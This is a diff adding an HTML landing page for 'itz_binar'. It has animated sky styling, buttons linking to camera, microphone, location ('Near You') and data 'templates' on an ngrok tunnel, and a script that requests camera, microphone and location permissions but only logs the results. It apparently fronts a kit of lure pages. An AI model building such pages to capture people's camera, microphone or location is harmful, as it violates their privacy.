@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>itz_binar - Sky Animation</title>
+    <style>
+        /* Global reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Body and html styling for full screen */
+        body, html {
+            height: 100%;
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        /* Sky background animation with clouds */
+        .sky {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, #70c5ce, #b2e7f7);
+            background-size: 400% 400%;
+            animation: skyAnimation 15s ease infinite;
+        }
+
+        @keyframes skyAnimation {
+            0% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        /* Cloud animation */
+        .clouds {
+            position: absolute;
+            top: 10%;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+
+        .cloud {
+            position: absolute;
+            background: #fff;
+            border-radius: 50%;
+            opacity: 0.7;
+            animation: cloudMove 60s linear infinite;
+        }
+
+        .cloud1 {
+            width: 200px;
+            height: 120px;
+            top: 10%;
+            left: -300px;
+            animation-duration: 90s;
+        }
+
+        .cloud2 {
+            width: 250px;
+            height: 150px;
+            top: 20%;
+            left: -400px;
+            animation-duration: 100s;
+        }
+
+        .cloud3 {
+            width: 150px;
+            height: 100px;
+            top: 30%;
+            left: -200px;
+            animation-duration: 110s;
+        }
+
+        @keyframes cloudMove {
+            0% {
+                transform: translateX(-100%);
+            }
+            100% {
+                transform: translateX(100%);
+            }
+        }
+
+        /* Container for content */
+        .container {
+            text-align: center;
+            padding: 40px;
+            background-color: rgba(0, 0, 0, 0.6);
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            width: 80%;
+            max-width: 900px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Main title styling */
+        h1 {
+            font-size: 50px;
+            color: #fff;
+            font-weight: 800;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+            letter-spacing: 4px;
+            animation: titleAnimation 2s ease-in-out;
+        }
+
+        @keyframes titleAnimation {
+            0% {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Button styles */
+        .btn {
+            display: inline-block;
+            margin: 15px;
+            padding: 20px 40px;
+            font-size: 18px;
+            font-weight: bold;
+            text-decoration: none;
+            color: #fff;
+            background: #2ecc71;
+            border-radius: 8px;
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
+            transition: all 0.4s ease-in-out;
+        }
+
+        /* Hover effects for buttons */
+        .btn:hover {
+            background: #27ae60;
+            transform: translateY(-5px);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
+        }
+
+        .btn:active {
+            transform: translateY(2px);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        /* Button container styling */
+        .btn-container {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+            margin-top: 30px;
+        }
+
+        /* Footer styling */
+        footer {
+            position: absolute;
+            bottom: 20px;
+            font-size: 14px;
+            color: #fff;
+            text-align: center;
+            width: 100%;
+        }
+
+        /* Responsive Styles for mobile */
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 30px;  /* Adjust title size for mobile */
+                letter-spacing: 2px;
+            }
+
+            .btn {
+                font-size: 16px;  /* Smaller font size on mobile */
+                padding: 15px 30px;  /* Adjust button padding */
+            }
+
+            .container {
+                padding: 30px;
+                width: 90%;  /* Make the container slightly smaller */
+            }
+
+            footer {
+                font-size: 12px;
+            }
+        }
+
+        /* Responsive Styles for very small screens */
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 24px;  /* Even smaller font for very small screens */
+                letter-spacing: 1px;
+            }
+
+            .btn {
+                font-size: 14px;  /* Further reduce button font size */
+                padding: 12px 25px;  /* Smaller buttons */
+            }
+
+            .container {
+                width: 95%;  /* Make the container almost full width */
+                padding: 20px;
+            }
+
+            footer {
+                font-size: 10px;
+            }
+        }
+
+    </style>
+</head>
+<body>
+
+    <!-- Sky animation background -->
+    <div class="sky"></div>
+
+    <!-- Cloud animations -->
+    <div class="clouds">
+        <div class="cloud cloud1"></div>
+        <div class="cloud cloud2"></div>
+        <div class="cloud cloud3"></div>
+    </div>
+
+    <div class="container">
+        <h1>Welcome to itz_binar</h1>
+
+        <div class="btn-container">
+            <a href="http://7746-130-193-199-252.ngrok-free.app/templates/camera_temp/index.html" target="_blank" class="btn">Camera Template</a>
+            <a href="http://7746-130-193-199-252.ngrok-free.app/templates/microphone/index.html" target="_blank" class="btn">Microphone Template</a>
+            <a href="http://7746-130-193-199-252.ngrok-free.app/templates/nearyou/index.html" target="_blank" class="btn">Near You Template</a>
+            <a href="http://7746-130-193-199-252.ngrok-free.app/templates/normal_data/index.html" target="_blank" class="btn">Normal Data Template</a>
+            <a href="http://7746-130-193-199-252.ngrok-free.app/templates/weather/index.html" target="_blank" class="btn">Weather Template</a>
+        </div>
+
+        <!-- Button to request permissions -->
+        <div class="btn-container">
+            <button id="permission-btn" class="btn" onclick="requestPermissions()">Request Camera, Microphone & Location</button>
+        </div>
+    </div>
+
+    <footer>
+        &copy; 2024 itz_binar | All Rights Reserved
+    </footer>
+
+    <script>
+        function requestPermissions() {
+            // Disable the button after click
+            const btn = document.getElementById('permission-btn');
+            btn.disabled = true;
+            btn.innerText = 'Requesting...';
+
+            // Request location access
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    console.log('Location permission granted', position);
+                }, function(error) {
+                    console.log('Location permission denied', error);
+                });
+            } else {
+                console.log('Geolocation not supported');
+            }
+
+            // Request camera and microphone access
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                .then(function(stream) {
+                    console.log('Camera and microphone permission granted');
+                })
+                .catch(function(error) {
+                    console.log('Camera and microphone permission denied', error);
+                });
+        }
+    </script>
+
+</body>
+</html>
